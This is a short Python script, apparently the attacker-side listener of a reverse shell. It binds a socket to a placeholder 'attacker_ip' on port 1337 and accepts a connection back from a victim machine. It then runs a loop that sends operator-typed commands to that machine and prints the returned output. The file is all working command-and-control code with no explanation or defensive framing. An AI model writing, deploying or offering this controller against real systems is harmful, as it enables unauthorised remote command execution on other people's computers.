import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048) # data at instance
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
	cmd = input("enter a command: ")
	
	if cmd == "quit":
		connection.send(b"quit") # string
		connection.close()
		break
		
	connection.send(bytes(cmd, "utf-8"))
	
	output = recv_data()
	print(output.decode("utf-8"))

print("Server has stopped")
